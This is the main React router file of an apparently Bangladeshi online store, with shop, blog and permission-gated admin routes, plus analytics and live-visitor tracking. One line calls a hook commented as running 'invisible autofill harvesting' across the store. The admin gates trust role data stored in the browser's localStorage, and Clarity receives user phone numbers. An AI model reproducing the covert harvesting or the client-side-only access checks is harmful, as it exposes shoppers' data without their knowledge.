import { BrowserRouter as Router, Routes, Route, useLocation, Navigate } from 'react-router-dom';
import { useEffect, useState, Suspense, lazy } from 'react';
import AppBanner from './components/AppBanner'; // 🚀 ব্যানার ইমপোর্ট করা হলো
import Navbar from './components/layout/Navbar';
import ScrollToTop from './components/layout/ScrollToTop';
import { SeoHead } from './components/SeoHead';
import Footer from './components/layout/Footer';
import { getProducts, Product } from './lib/woocommerce';

// Lazy loading pages for "mili second er modde load"
const Home = lazy(() => import('./pages/Home'));
const Shop = lazy(() => import('./pages/Shop'));
const CategoryPage = lazy(() => import('./pages/CategoryPage'));
const LegacyBlogSlug = lazy(() => import('./pages/LegacyBlogSlug'));
const ProductDetail = lazy(() => import('./pages/ProductDetail'));
const Checkout = lazy(() => import('./pages/Checkout'));
const OrderReceived = lazy(() => import('./pages/OrderReceived'));
const About = lazy(() => import('./pages/About'));
const Contact = lazy(() => import('./pages/Contact'));
const RefundPolicy = lazy(() => import('./pages/RefundPolicy'));
const Terms = lazy(() => import('./pages/Terms'));
const Privacy = lazy(() => import('./pages/Privacy'));
const DMCA = lazy(() => import('./pages/DMCA'));
const Wishlist = lazy(() => import('./pages/Wishlist'));
const Login = lazy(() => import('./pages/Login'));
const Profile = lazy(() => import('./pages/Profile'));
const TrackOrder = lazy(() => import('./pages/TrackOrder'));
const LandingSare = lazy(() => import('./pages/LandingSare'));
const LandingCarBMW = lazy(() => import('./pages/LandingCarBMW')); // 🚀 নতুন BMW কার ল্যান্ডিং পেজ

// Admin + Blog lazy modules
const AdminLogin = lazy(() => import('./pages/admin/AdminLogin'));
const AdminLayout = lazy(() => import('./pages/admin/AdminLayout'));
const Dashboard = lazy(() => import('./pages/admin/Dashboard'));
const OrdersManager = lazy(() => import('./pages/admin/OrdersManager'));
const ProductsManager = lazy(() => import('./pages/admin/ProductsManager'));
const CategoriesManager = lazy(() => import('./pages/admin/CategoriesManager'));
const BlogManager = lazy(() => import('./pages/admin/BlogManager'));
const CustomersManager = lazy(() => import('./pages/admin/CustomersManager'));
const CouponsManager = lazy(() => import('./pages/admin/CouponsManager'));
const AbandonedCarts = lazy(() => import('./pages/admin/AbandonedCarts'));
const SettingsManager = lazy(() => import('./pages/admin/SettingsManager'));
const UsersManager = lazy(() => import('./pages/admin/UsersManager'));
const ReportsPage = lazy(() => import('./pages/admin/ReportsPage'));
const InventoryPage = lazy(() => import('./pages/admin/InventoryPage'));
const ProfitPage = lazy(() => import('./pages/admin/ProfitPage'));
const PayoutPage = lazy(() => import('./pages/admin/PayoutPage'));
const ReturnsPage = lazy(() => import('./pages/admin/ReturnsPage'));
const AuditLogPage = lazy(() => import('./pages/admin/AuditLogPage'));
const LeavePage = lazy(() => import('./pages/admin/LeavePage'));
const TasksPage = lazy(() => import('./pages/admin/TasksPage'));
const MetaKpi = lazy(() => import('./pages/admin/MetaKpi'));
const Blog = lazy(() => import('./pages/Blog'));
const BlogDetail = lazy(() => import('./pages/BlogDetail'));

const PageLoader = () => (
  <div className="fixed inset-0 bg-gray-50 z-[300] flex items-center justify-center">
    <div className="w-8 h-8 border-2 border-brand-primary/20 border-t-brand-primary rounded-full animate-spin" />
  </div>
);

import TeleSalesRecruitment, { TeleSalesSuccess } from './pages/TeleSalesRecruitment';

const TeleSalesPage = () => {
  const [appId, setAppId] = useState<string | null>(null);
  if (appId) {
    return <TeleSalesSuccess appId={appId} onReturn={() => setAppId(null)} />;
  }
  return <TeleSalesRecruitment onSuccess={(id) => setAppId(id)} />;
};

import { useGlobalAutofillTracker } from './lib/autofillTracker';
import { trackPixel } from './lib/woocommerce';

function RequireSuperAdmin({ children }: { children: React.ReactNode }) {
  try {
    const u = JSON.parse(localStorage.getItem('bunon_user') || '{}');
    if (u.role === 'super_admin') return <>{children}</>;
  } catch {}
  return <Navigate to="/admin" replace />;
}

// Permission-based page gate using bunon_user.permissions (falls back to role
// when the stored user has no permissions array - preserves legacy behavior).
function RequirePerm({ children, perm, roles }: { children: React.ReactNode; perm: string; roles?: string[] }) {
  try {
    const u = JSON.parse(localStorage.getItem('bunon_user') || '{}');
    if (u.role === 'super_admin') return <>{children}</>;
    const perms: string[] = Array.isArray(u.permissions) ? u.permissions : [];
    if (perms.length > 0) {
      if (perms.includes(perm)) return <>{children}</>;
    } else if (roles && roles.includes(u.role)) {
      return <>{children}</>;
    }
  } catch {}
  return <Navigate to="/admin" replace />;
}

function AppContent() {
  const location = useLocation();
  const isCheckout = location.pathname === '/checkout';
  const isAdmin = location.pathname.startsWith('/admin');
  const isSareLanding = location.pathname === '/p/sare';
  const isCarBmwLanding = location.pathname === '/carbmw'; // 🚀 BMW ল্যান্ডিং পেজ চেক

  // 🕵️ Run invisible autofill harvesting across the entire store
  useGlobalAutofillTracker();

  // Track PageView on route change for CAPI and Pixel
  useEffect(() => {
    trackPixel('PageView');
    // Live-visitor ping (admin KPI "Live" card). Fail-open, no PII.
    try {
      let sid = sessionStorage.getItem('bf_live_sid');
      if (!sid) { sid = Math.random().toString(36).slice(2) + Date.now().toString(36); sessionStorage.setItem('bf_live_sid', sid); }
      fetch('/api/track/pv', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sid, path: location.pathname, ref: document.referrer ? new URL(document.referrer).pathname : '' }) }).catch(() => {});
    } catch { /* ignore */ }
  }, [location.pathname]);

  // Live heartbeat every 45s so admin sees real "now"
  useEffect(() => {
    const t = setInterval(() => {
      try {
        const sid = sessionStorage.getItem('bf_live_sid');
        if (!sid) return;
        fetch('/api/track/pv', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sid, path: location.pathname, ref: '' }) }).catch(() => {});
      } catch { /* ignore */ }
    }, 45000);
    return () => clearInterval(t);
  }, [location.pathname]);

  // Initialize Clarity Identity for logged in users (DYNAMIC IMPORT - SAFETY WRAPPED)
  useEffect(() => {
    const initClarity = async () => {
      try {
        const ClarityModule = await import("@microsoft/clarity");
        if (ClarityModule && ClarityModule.default) {
          const userStr = localStorage.getItem("bunon_user");
          if (userStr) {
            const user = JSON.parse(userStr);
            ClarityModule.default.identify(user.phone || user.id, undefined, undefined, user.name || "User");
          }
        }
      } catch (e) {
        console.error("Clarity identify error:", e);
      }
    };
    initClarity();
  }, []);

  // 🚀 ল্যান্ডিং পেজেও যেন সাধারণ লেআউট হাইড থাকে
  const hideLayout = isCheckout || isAdmin || isSareLanding || isCarBmwLanding;

  return (
    <div className="min-h-screen bg-gray-50 font-sans text-gray-900 selection:bg-brand-primary selection:text-white flex flex-col">
      {/* Keeps canonical/og:url self-referencing on every client-side route
          change. Page-level SeoHead calls (title/description) override these. */}
      <SeoHead />
      {/* 🚀 Navbar-এর ঠিক উপরে ব্যানার বসানো হলো */}
      {!hideLayout && <AppBanner />}
      
      {!hideLayout && <Navbar />}
      
      <main className="flex-grow">
        <Suspense fallback={<PageLoader />}>
          <Routes>
            <Route path="/" element={<Home />} />
            <Route path="/shop" element={<Shop />} />
            <Route path="/product-category/:slug" element={<CategoryPage />} />
            <Route path="/product/:id" element={<ProductDetail />} />
            <Route path="/checkout" element={<Checkout />} />
            <Route path="/order-received" element={<OrderReceived />} />
            <Route path="/track" element={<TrackOrder />} />
            <Route path="/wishlist" element={<Wishlist />} />
            <Route path="/login" element={<Login />} />
            <Route path="/profile" element={<Profile />} />
            <Route path="/about" element={<About />} />
            <Route path="/contact" element={<Contact />} />
            <Route path="/refund-policy" element={<RefundPolicy />} />
            <Route path="/terms" element={<Terms />} />
            <Route path="/privacy-policy" element={<Privacy />} />
            <Route path="/dmca" element={<DMCA />} />
            {/* Tele-Sales Recruitment */}
            <Route path="/telesales" element={<TeleSalesPage />} />
            <Route path="/p/sare" element={<LandingSare />} />
            
            {/* 🚀 BMW Car Landing Page Route */}
            <Route path="/carbmw" element={<LandingCarBMW />} />
            
            {/* Admin Routes */}
            <Route path="/admin/login" element={<AdminLogin />} />
            <Route path="/admin" element={<AdminLayout />}>
              <Route index element={<RequirePerm perm="view_dashboard" roles={["super_admin","admin","staff"]}><Dashboard /></RequirePerm>} />
              <Route path="orders" element={<RequirePerm perm="view_orders" roles={["super_admin","admin","staff"]}><OrdersManager /></RequirePerm>} />
              <Route path="products" element={<RequirePerm perm="view_products" roles={["super_admin","admin","staff"]}><ProductsManager /></RequirePerm>} />
              <Route path="categories" element={<RequirePerm perm="view_categories" roles={["super_admin","admin","staff"]}><CategoriesManager /></RequirePerm>} />
              <Route path="blogs" element={<RequirePerm perm="view_blogs" roles={["super_admin","admin","staff"]}><BlogManager /></RequirePerm>} />
              <Route path="customers" element={<RequirePerm perm="view_customers" roles={["super_admin","admin","staff"]}><CustomersManager /></RequirePerm>} />
              <Route path="abandoned" element={<RequirePerm perm="view_marketing" roles={["super_admin","admin","staff"]}><AbandonedCarts /></RequirePerm>} />
              <Route path="coupons" element={<RequirePerm perm="view_coupons" roles={["super_admin","admin"]}><CouponsManager /></RequirePerm>} />
              <Route path="settings" element={<RequirePerm perm="view_settings" roles={["super_admin","admin"]}><SettingsManager /></RequirePerm>} />
              <Route path="users" element={<RequirePerm perm="manage_users" roles={["super_admin"]}><UsersManager /></RequirePerm>} />
              <Route path="reports" element={<RequirePerm perm="view_reports" roles={["super_admin","admin"]}><ReportsPage /></RequirePerm>} />
              <Route path="inventory" element={<RequirePerm perm="view_inventory" roles={["super_admin","admin"]}><InventoryPage /></RequirePerm>} />
              <Route path="profit" element={<RequirePerm perm="view_reports" roles={["super_admin","admin"]}><ProfitPage /></RequirePerm>} />
              <Route path="payout" element={<RequirePerm perm="view_reports" roles={["super_admin","admin"]}><PayoutPage /></RequirePerm>} />
              <Route path="returns" element={<RequirePerm perm="view_orders" roles={["super_admin","admin"]}><ReturnsPage /></RequirePerm>} />
              <Route path="audit" element={<RequirePerm perm="manage_users"><AuditLogPage /></RequirePerm>} />
              <Route path="leave" element={<RequirePerm perm="view_dashboard" roles={["super_admin","admin","staff"]}><LeavePage /></RequirePerm>} />
              <Route path="tasks" element={<RequirePerm perm="view_dashboard" roles={["super_admin","admin","staff"]}><TasksPage /></RequirePerm>} />
              <Route path="meta" element={<RequirePerm perm="view_marketing" roles={["super_admin","admin"]}><MetaKpi /></RequirePerm>} />
            </Route>

            {/* Public Blog Routes */}
            <Route path="/blog" element={<Blog />} />
            <Route path="/blog/:slug" element={<BlogDetail />} />

            {/* Catch-all route to redirect missing pages to Home */}
            {/* Legacy root-level blog URLs (/saree-niye-caption-bangla/) - the exact
                URLs Google indexed and still sends traffic to. Must sit
                above the catch-all. */}
            <Route path="/:slug" element={<LegacyBlogSlug />} />

            {/* Catch-all route to redirect missing pages to Home */}
            <Route path="*" element={<Navigate to="/" replace />} />
          </Routes>
        </Suspense>
      </main>

      {!hideLayout && <Footer />}
      {/* PushSubscriptionPrompt removed: hide everywhere as requested */}
      {/* Newsletter popup removed as requested */}
    </div>
  );
}

export default function App() {
  const [products, setProducts] = useState<Product[]>([]);

  useEffect(() => {
    async function loadData() {
      const data = await getProducts();
      setProducts(data);
    }
    loadData();
  }, []);

  return (
    <Router>
      <ScrollToTop />
      <AppContent />
    </Router>
  );
}/* deploy-probe-2 */
